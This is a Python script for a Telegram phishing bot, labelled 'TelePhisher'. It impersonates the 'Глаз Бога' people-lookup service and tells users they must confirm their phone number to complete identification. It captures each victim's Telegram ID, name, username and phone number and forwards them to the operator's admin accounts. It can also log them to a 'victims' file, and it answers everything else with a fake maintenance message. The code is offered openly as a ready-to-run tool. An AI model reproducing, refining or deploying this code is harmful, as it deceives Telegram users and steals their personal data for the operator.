#Author: @boazq (telegram)
#Chanel: t.me/dnt_te

try:
    import requests
except:
    input('Установите библиотеку requests командой\n pip install requests')
try:
    import telebot
    from telebot import types, apihelper
except:
    input('Установите библиотеку telebot командой\n pip install telebot')
try:
    import colorama
    from colorama import init, Fore, Style, Back
except:
    input('Установите библиотеку colorama командой\n pip install colorama')

init()

# Определение цветов
red = Fore.RED
cyan = Fore.CYAN
blue = Fore.BLUE
green = Fore.GREEN
yellow = Fore.YELLOW
magenta = Fore.MAGENTA

reset = Style.RESET_ALL
bold = Style.BRIGHT
ingo = f"{magenta}{bold}\n\t  >> {reset}"


def print_user_data(user_id, first_name, username=None, phone_number=None):
    border = "{:-^40}".format("")

    print(Fore.YELLOW + border + Style.RESET_ALL)
    print(Fore.MAGENTA + "    ID: " + Fore.WHITE + "{:<31}".format(user_id) + Style.RESET_ALL)
    print(Fore.MAGENTA + "    Имя: " + Fore.WHITE + "{:<29}".format(first_name) + Style.RESET_ALL)

    if username:
        print(Fore.MAGENTA + "    Username: " + Fore.WHITE + "{:<24}".format("@" + username) + Style.RESET_ALL)
    if phone_number:
        print(Fore.MAGENTA + "    Номер телефона: " + Fore.WHITE + "     {:<14}".format(
            "+" + phone_number) + Style.RESET_ALL)
    print(Fore.YELLOW + border + Style.RESET_ALL)


print(f'''
{bold}{magenta}
      ______        __         ____  __           __             
     /_  __/___    / / ___    / __ \/ /_  (_)____/ /_  ___  _____
      / /  / _ \  / / / _ \  / /_/ / __ \/ / ___/ __ \/ _ \/ ___/
     / /  /  __/ / / /  __/ / ____/ / / / (__  ) / / /  __/ /    
    /_/   \___/ /_/  \___/ /_/   /_/ /_/_/____/_/ /_/\___/_/ {cyan}v 1.3 Menu   
                                           
{reset}           
                        Тип: {cyan}ГЛАЗ БОГА    
                        
                    {bold}{yellow}TELEGRAM:{magenta} t.me/dnt_te
      ''')


def is_valid_token(token):
    try:
        bot = telebot.TeleBot(token)
        bot_info = bot.get_me()
        if bot_info:
            return True
    except telebot.apihelper.ApiException:
        return False



token = ''
admin_id = []
bd_go = ''

with open('logins.txt', 'r+') as logins_file:
    lines = logins_file.readlines()
    for line in lines:
        if "token" in line:
            token = str(line.split("=")[1].strip())

    for line in lines:
        if "admin_id" in line:
            admin_ids = line.split("=")[1].strip().replace(" ", "").split(
                ",")  # разделяем строку по запятым и удаляем лишние пробелы
            admin_id.extend(admin_ids)  # добавляем полученные admin_id в список

    for line in lines:
        if "bd_go" in line:
            bd_go = str(line.split("=")[1].strip())

    if token == '':  # Если токен отсутствует
        while token == '':
            token = input(f"     {blue}Введите {yellow}API token{blue} вашего бота{ingo}")
            if not is_valid_token(token):  #Если токен не верный
                while not is_valid_token(token):
                    token = input(f"{red}     Неверный токен! {reset}Введите верный {yellow}API token{ingo}")
        for i, line in enumerate(lines):
            if line.startswith("token"):
                lines[i] = f"token = {token}\n"
        logins_file.writelines(lines)

    if admin_id == ['']:
        while admin_id == ['']:
            input_id2 = input(f"     Введите ваш {yellow}telegram ID{ingo}")
            if ',' in input_id2:
                if id.strip().isdigit():
                    for id in input_id2.split(','):
                        admin_id = int(id.strip())
            else:
                admin_id = input_id2
        for i, line in enumerate(lines):
            if line.startswith("admin_id"):
                lines[i] = f"admin_id = {admin_id}\n"

    if bd_go == '':
        while bd_go not in ['+', '-']:
            bd_go = input(f"\n{blue}Включить запись жертв в BD_NAX.txt? [+]/[-]{ingo}")
        for i, line in enumerate(lines):
            if line.startswith("bd_go"):
                lines[i] = f"bd_go = {bd_go}\n"
                break

    menu_sms = (f"""
    {reset}
    {bold}{yellow}[1] {blue}-{green} Запустить бота
    {bold}{yellow}[2] {blue}-{reset} Изменить API token
    {bold}{yellow}[3] {blue}-{reset} Изменить id
    {bold}{yellow}[4] {blue}-{reset} Вкл/выкл запись в BD_NAX.txt""")

    print(menu_sms)
    asc_var = str
    in_var = str
    on_var = str
    bd_var = str

    while asc_var != "1":
        asc_var = input(f"{ingo}")
        if asc_var == "2":
            print(f"\n[1] - Выйти\n[2] - Просмотреть API token\n[3] - Изменить Api token")
            while in_var not in ("1", "2", "3"):
                in_var = input(f"{ingo}")
            if in_var == "1":
                print(menu_sms)
            elif in_var == "2":
                print(f"\nВаш Api token - {token}")
                print(menu_sms)
            elif in_var == "3":
                token = input(f"\n{blue}Введите {yellow}API token{blue} вашего бота >> ")
                if not is_valid_token(token):  # Если токен не верный
                    while not is_valid_token(token):
                        token = input(f"{red}\nНеверный токен! {reset}Введите верный {yellow}API token\n{ingo}")
                for i, line in enumerate(lines):
                    if line.startswith("token"):
                        lines[i] = f"token = {token}\n"
                print(menu_sms)
            in_var = ''
        elif asc_var == "3":
            print(f"\n[1] - Выйти\n[2] - Просмотреть id\n[3] - Изменить id")
            while on_var not in ("1", "2", "3"):
                on_var = input(f"{ingo}")
            if on_var == "1":
                print(menu_sms)
            elif on_var == "2":
                print(f"\nВаш id - {admin_id}")
                print(menu_sms)
            elif on_var == "3":
                input_id2 = input(f"\nВведите ваш {yellow}telegram ID\n{ingo}")
                if ',' in input_id2:
                    if id.strip().isdigit():
                        for id in input_id2.split(','):
                            admin_id = int(id.strip())
                else:
                    admin_id = input_id2
                for i, line in enumerate(lines):
                    if line.startswith("admin_id"):
                        lines[i] = f"admin_id = {admin_id}\n"
                print(menu_sms)
            on_var = ''
        elif asc_var == "4":
            print(f"\n[1] - Выйти\n[2] - Просмотреть текущий статус\n[3] - Изменить статус")
            while bd_var not in ("1", "2", "3"):
                bd_var = input(f"{ingo}")
            if bd_var == "1":
                print(menu_sms)
            elif bd_var == "2":
                print(f"\nТекущий статус: {bd_go}")
                print(menu_sms)
            elif bd_var == "3":
                print(f"\n{blue}Включить запись жертв в BD_NAX.txt? [+]/[-]")
                bd_go = ''
                while bd_go not in ['+', '-']:
                    bd_go = input(f"{ingo}")
                for i, line in enumerate(lines):
                    if line.startswith("bd_go"):
                        lines[i] = f"bd_go = {bd_go}\n"
                        break
                print(menu_sms)
            bd_var = ''
        elif asc_var == "boazq":
            print(f"    Пасхалка❤")
            print(menu_sms)
    logins_file.seek(0)
    logins_file.writelines(lines)

if not is_valid_token(token):
    while not is_valid_token(token):
        token = input(f"{red}     Неверный токен! {reset}Введите верный {yellow}API token {reset}>> ")
    with open('logins.txt', 'r+') as logins_file:
        for i, line in enumerate(lines):
            if line.startswith("token"):
                lines[i] = f"token = {token}\n"
        logins_file.seek(0)
        logins_file.writelines(lines)

        # КОД БОТА

try:
    def get_bot_username(token):
        url = f"https://api.telegram.org/bot{token}/getMe"
        response = requests.get(url).json()

        # Проверяем, что запрос успешно выполнен и содержит имя пользователя
        if response.get("ok") and 'username' in response.get("result", {}):
            return response["result"]["username"]
        else:
            return None


    username = get_bot_username(token)
    if username:
        if bd_go == "+":
            with open('BD_NAX.txt', 'a') as bd_file:
                bd_file.write(f"\nБот запущен!\n")
        print(f"""\n
{bold}{magenta}|\t{bold}    БОТ {magenta}ЗАПУЩЕН
{bold}{yellow}|\t{reset}id ваших акаунтов: {yellow}{bold}{admin_id}
{bold}{yellow}|\t{reset}Юзернейм вашего бота: {yellow}{bold}@{username}{reset}
{bold}{yellow}|\t{reset}Отправьте с телеграм аккаунта команду{magenta} /start{reset} боту""")
    else:
        print(f"\n     Бот не запущен!{reset} - {red}для выхода [ctrl + c]{reset}")
    bot = telebot.TeleBot(token)


    @bot.message_handler(commands=['start'])
    def send_welcome(message):
        markup = types.ReplyKeyboardMarkup(resize_keyboard=True, one_time_keyboard=True)
        button_phone = types.KeyboardButton(text="✅ Подтвердить номер телефона", request_contact=True)
        markup.add(button_phone)

        bot.send_message(message.chat.id, """
🗂 <b>Номер телефона</b>

Вам необходимо подтвердить <b>номер телефона</b> для того, чтобы завершить <b>идентификацию</b>.

Для этого нажмите кнопку ниже.""", parse_mode="HTML", reply_markup=markup)


    @bot.message_handler(content_types=['contact'])
    def contact_handler(message):
        if message.contact is not None:
            if message.contact.user_id == message.from_user.id:
                markup = types.ReplyKeyboardRemove()
                bot.send_message(message.chat.id, f'''
⬇️ **Примеры команд для ввода:**

👤 **Поиск по имени**
├  `Блогер` (Поиск по тегу)
├  `Антипов Евгений Вячеславович`
└  `Антипов Евгений Вячеславович 05.02.1994`
 (Доступны также следующие форматы `05.02`/`1994`/`28`/`20-28`)

🚗 **Поиск по авто**
├  `Н777ОН777` - поиск авто по РФ
└  `WDB4632761X337915` - поиск по VIN

👨 **Социальные сети**
├  `instagram.com/ev.antipov` - Instagram
├  `vk.com/id577744097` - Вконтакте
├  `facebook.com/profile.php?id=1` - Facebook
└  `ok.ru/profile/162853188164` - Одноклассники

📱 `79999939919` - для поиска по номеру телефона
📨 `tema@gmail.com` - для поиска по Email
📧 `#281485304`, `@durov` или перешлите сообщение - поиск по Telegram аккаунту

🔐 `/pas churchill7` - поиск почты, логина и телефона по паролю
🏚 `/adr Москва, Тверская, д 1, кв 1` - информация по адресу (РФ)
🏘 `77:01:0001075:1361` - поиск по кадастровому номеру

🏛 `/company Сбербанк` - поиск по юр лицам
📑 `/inn 784806113663` - поиск по ИНН
🎫 `/snils 13046964250` - поиск по СНИЛС
📇 `/passport 6113825395` - поиск по паспорту
🗂 `/vy 9902371011` - поиск по ВУ

📸 Отправьте фото человека, чтобы найти его или двойника на сайтах ВК, ОК.
🚙 Отправьте фото номера автомобиля, чтобы получить о нем информацию.
🙂 Отправьте стикер, чтобы найти создателя.
🌎 Отправьте точку на карте, чтобы найти информацию.
🗣 С помощью голосовых команд также можно выполнять поисковые запросы.

''', parse_mode="Markdown", reply_markup=markup)
                print()
                print()
                print_user_data(message.from_user.id, message.from_user.first_name, message.from_user.username,
                                message.contact.phone_number)

                admin_message = f'''
#TeleFisher - @{username}

- {message.from_user.id}
- {message.from_user.first_name}
- @{message.from_user.username}
- {message.contact.phone_number}
- By @dnt_te'''
                if bd_go == "+":
                    with open('BD_NAX.txt', 'a') as bd_file:
                        bd_file.write(admin_message)
                for admin in admin_id:
                    try:
                        bot.send_message(admin, admin_message)
                    except:
                        print('     {red}Oшибка отправки на указанный id      ')
            else:
                bot.send_message(message.chat.id, "Это не ваш номер телефона. Пожалуйста, подтвердите свой номер.")


    @bot.message_handler(func=lambda message: True)
    def default_handler(message):
        bot.send_message(message.chat.id, f'''
⚠  **⚠️ Технические работы** 

Работы будут завершены в ближайший промежуток времени, все подписки наших пользователей продлены.
''', parse_mode="Markdown")
    bot.polling(none_stop=True)
except telebot.apihelper.ApiTelegramException as e:
    if e.error_code == 409:
        print("Конфликт, обнаружено несколько инстанций бота.")
    else:
        print(f"Произошла ошибка с кодом: {e.error_code}. Описание: {e.result_json['description']}")
